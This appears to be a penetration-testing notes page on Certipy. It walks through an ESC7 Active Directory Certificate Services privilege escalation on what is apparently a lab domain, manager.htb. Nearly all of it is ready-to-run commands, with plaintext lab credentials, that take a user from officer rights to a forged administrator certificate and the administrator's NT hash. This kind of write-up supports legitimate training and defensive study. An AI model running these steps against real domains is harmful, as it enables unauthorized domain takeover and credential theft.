# Certipy

## About

[Certipy](https://github.com/ly4k/Certipy) is a tool for Active Directory Certificate Services enumeration and abuse. It's is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). If you're not familiar with AD CS and the various domain escalation techniques,from the github, a good resource is: [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin\_).

## Install

### Using pip

```bash
pip3 install certipy-ad
```

## Usage

We can use the `find` argument to enumerate AD CS certificate templates, certificate authorities and other configurations and with `-vulnerable` it can show us what "ESC#"(Escalation number, for a full list, checkout the Github they are vulnerable to. In this example, it's Vulnable to ESC7,  which is when a user has the `Manage CA` or `Manage Certificates` access right on a CA.

```bash
certipy-ad find -vulnerable -u raven@dc01.manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.139.52 -stdout
```

<figure><img src="../../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>

So in this example we have Ravens credentials and can upgrade her account to have additional permissions. If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

The `SubCA` template can be enabled on the CA with the `-enable-template` parameter. By default, the `SubCA` template is enabled.

```bash
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

<figure><img src="../../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>

If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the `SubCA` template. This request will be denied, but we will save the private key and note down the request ID. With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.

```bash
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
```

<figure><img src="../../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.

```bash
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 17 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

<figure><img src="../../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>

And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.

```bash
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 17
```

<figure><img src="../../.gitbook/assets/image (956).png" alt=""><figcaption></figcaption></figure>

Now that we have the Administrator.pfx file we can obtain the admin hash using the `auth` argument. [From the github](https://github.com/ly4k/Certipy#authenticate) "The `auth` command will use either the PKINIT Kerberos extension or Schannel protocol for authentication with the provided certificate. Kerberos can be used to retrieve a TGT and the NT hash for the target user, whereas Schannel will open a connection to LDAPS and drop into an interactive shell with limited LDAP commands. See the [blog posts](https://research.ifcr.dk/) for more information on when to use which option"

```bash
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'manager.htb' -dc-ip 10.129.139.52
```

<figure><img src="../../.gitbook/assets/image (957).png" alt=""><figcaption></figcaption></figure>
